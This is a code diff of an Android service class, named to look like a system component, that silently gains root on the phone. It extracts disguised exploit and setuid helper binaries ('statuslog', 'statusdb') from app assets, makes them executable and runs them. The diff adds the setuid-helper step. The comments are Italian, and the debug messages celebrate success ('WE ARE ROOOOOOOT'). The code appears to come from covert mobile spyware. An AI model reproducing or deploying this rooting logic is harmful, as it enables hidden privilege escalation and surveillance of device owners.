@@ -1,10 +1,13 @@
 package com.android.service;
 
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.OutputStream;
 
 import android.app.Service;
 import android.content.Intent;
@@ -23,7 +26,7 @@ public class ServiceCore extends Service {
 
 	private Core core;
 	private String shellFile;
-	
+
 	@Override
 	public IBinder onBind(Intent intent) {
 		return null;
@@ -32,7 +35,8 @@ public class ServiceCore extends Service {
 	@Override
 	public void onCreate() {
 		super.onCreate();
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " (onCreate)");
+		if (Cfg.DEBUG)
+			Log.d("QZ", TAG + " (onCreate)");
 
 		// Toast.makeText(this, "Service Created", Toast.LENGTH_LONG).show();
 		Status.setAppContext(getApplicationContext());
@@ -41,7 +45,8 @@ public class ServiceCore extends Service {
 	@Override
 	public void onDestroy() {
 		super.onDestroy();
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " (onDestroy)");
+		if (Cfg.DEBUG)
+			Log.d("QZ", TAG + " (onDestroy)");
 
 		// Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
 		core.Stop();
@@ -51,17 +56,21 @@ public class ServiceCore extends Service {
 	@Override
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
-		
+
 		this.shellFile = "rdb";
-		
+
 		if (checkRoot() == true) {
-			Status.self().setRoot(true);			
+			Status.self().setRoot(true);
 		} else {
 			Status.self().setRoot(false);
-			
+
 			// Don't exploit if we have no SD card mounted
-			if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
+			if (android.os.Environment.getExternalStorageState().equals(
+					android.os.Environment.MEDIA_MOUNTED)) {
 				Status.self().setRoot(root());
+			}else{
+				if (Cfg.DEBUG)
+					Log.d("QZ", TAG + " (onStart) no media mounted");
 			}
 		}
 
@@ -72,16 +81,19 @@ public class ServiceCore extends Service {
 
 	private boolean root() {
 		try {
-			if(!Cfg.EXP){
-				if(Cfg.DEBUG) Log.d("QZ", TAG + " (root): Exploit disabled by conf");
+			if (!Cfg.EXP) {
+				if (Cfg.DEBUG)
+					Log.d("QZ", TAG + " (root): Exploit disabled by conf");
 				return false;
 			}
 			String crashlog = "errorlog";
 			String exploit = "statuslog";
+			String suidext = "statusdb";
 			boolean isRoot = false;
 
 			// Creiamo il crashlog
-			FileOutputStream fos = getApplicationContext().openFileOutput(crashlog, MODE_PRIVATE);
+			FileOutputStream fos = getApplicationContext().openFileOutput(
+					crashlog, MODE_PRIVATE);
 			fos.close();
 
 			// Scriviamo l'exploit sul disco
@@ -95,15 +107,30 @@ public class ServiceCore extends Service {
 			fsexpl.write(content);
 			fsexpl.close();
 
+			// scriviamo suidext su disco
+			is = getAssets().open(suidext);
+
+			content = new byte[is.available()];
+			is.read(content);
+			is.close();
+
+			FileOutputStream fsext = openFileOutput(suidext, MODE_PRIVATE);
+			fsext.write(content);
+			fsext.close();
+
 			// Eseguiamo l'exploit
 			File filesPath = getApplicationContext().getFilesDir();
 			String path = filesPath.getAbsolutePath();
 
-			Runtime.getRuntime().exec("/system/bin/chmod 755 " + path + "/" + exploit);
-			Runtime.getRuntime().exec("/system/bin/chmod 666 " + path + "/" + crashlog);
+			Runtime.getRuntime().exec(
+					"/system/bin/chmod 755 " + path + "/" + exploit);
+			Runtime.getRuntime().exec(
+					"/system/bin/chmod 755 " + path + "/" + suidext);
+			Runtime.getRuntime().exec(
+					"/system/bin/chmod 666 " + path + "/" + crashlog);
 
 			final String exppath = path + "/" + exploit;
-			
+
 			ExploitRunnable r = new ExploitRunnable(exppath);
 			new Thread(r).start();
 
@@ -123,20 +150,29 @@ public class ServiceCore extends Service {
 				r.getProcess().destroy();
 
 			if (isRoot) {
-				if(Cfg.DEBUG){ 
-					Log.d("QZ", TAG + " (onStart): WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!");
-					Toast.makeText(this, "WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!", Toast.LENGTH_LONG).show();
+				if (Cfg.DEBUG) {
+					Log.d("QZ",
+							TAG
+									+ " (onStart): WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!");
+					Toast.makeText(this,
+							"WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!",
+							Toast.LENGTH_LONG).show();
 				}
 			} else {
-				if(Cfg.DEBUG){
-					Log.d("QZ", TAG + " (onStart): Fucking third party exploits, they never work!");
-					Toast.makeText(this, "Fucking third party exploits, they never work!", Toast.LENGTH_LONG).show();
+				if (Cfg.DEBUG) {
+					Log.d("QZ",
+							TAG
+									+ " (onStart): Fucking third party exploits, they never work!");
+					Toast.makeText(this,
+							"Fucking third party exploits, they never work!",
+							Toast.LENGTH_LONG).show();
 				}
-				
+
 			}
 		} catch (Exception e1) {
 			e1.printStackTrace();
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " (root): Exception on root()");
+			if (Cfg.DEBUG)
+				Log.d("QZ", TAG + " (root): Exception on root()");
 			return false;
 		}
 
@@ -152,27 +188,72 @@ public class ServiceCore extends Service {
 
 		return true;
 	}
-	
+
 	// Exploit thread
 	class ExploitRunnable implements Runnable {
-		private Process process;
+		private Process localProcess;
 		private String exppath;
-		
+
 		public ExploitRunnable(String exppath) {
 			this.exppath = exppath;
 		}
-		
+
 		public Process getProcess() {
-			return process;	
+			return localProcess;
 		}
-		
+
 		public void run() {
 			try {
-				process = Runtime.getRuntime().exec(exppath);
+				localProcess = Runtime.getRuntime().exec(exppath);
+				
+				OutputStream localOutputStream = localProcess.getOutputStream();
+				DataOutputStream localDataOutputStream = new DataOutputStream(
+						localOutputStream);
+				InputStream localInputStream1 = localProcess.getInputStream();
+				DataInputStream inputStdout = new DataInputStream(
+						localInputStream1);
+				InputStream localInputStream2 = localProcess.getErrorStream();
+				DataInputStream inputStderr = new DataInputStream(
+						localInputStream2);
+
+				try {
+					localProcess.waitFor();
+				} catch (InterruptedException e) {
+					if (Cfg.DEBUG) {
+						Log.d("QZ", TAG + " (waitFor): " + e);
+						e.printStackTrace();
+					}
+					
+				}
+				int exitValue = localProcess.exitValue();
+				if (Cfg.DEBUG) 
+					Log.d("QZ", TAG + " (waitFor): exitValue " + exitValue);
+				while (inputStdout.available() > 0) {
+					String str = inputStdout.readLine();
+					if (Cfg.DEBUG) {
+						Log.d("QZ", TAG + " (stdout): " + str);
+					}
+				}
+				
+				while (inputStderr.available() > 0) {
+					String str = inputStdout.readLine();
+					if (Cfg.DEBUG) {
+						Log.d("QZ", TAG + " (stderr): " + str);
+					}
+				}
+				
+				inputStdout.close();
+				inputStderr.close();
+
 			} catch (IOException e) {
-				process = null;
-				e.printStackTrace();
+				localProcess = null;
+				if (Cfg.DEBUG) {
+					Log.d("QZ", TAG
+							+ " (ExploitRunnable): Exception on run(): " + e);
+					e.printStackTrace();
+				}
 			}
 		}
+
 	};
 }
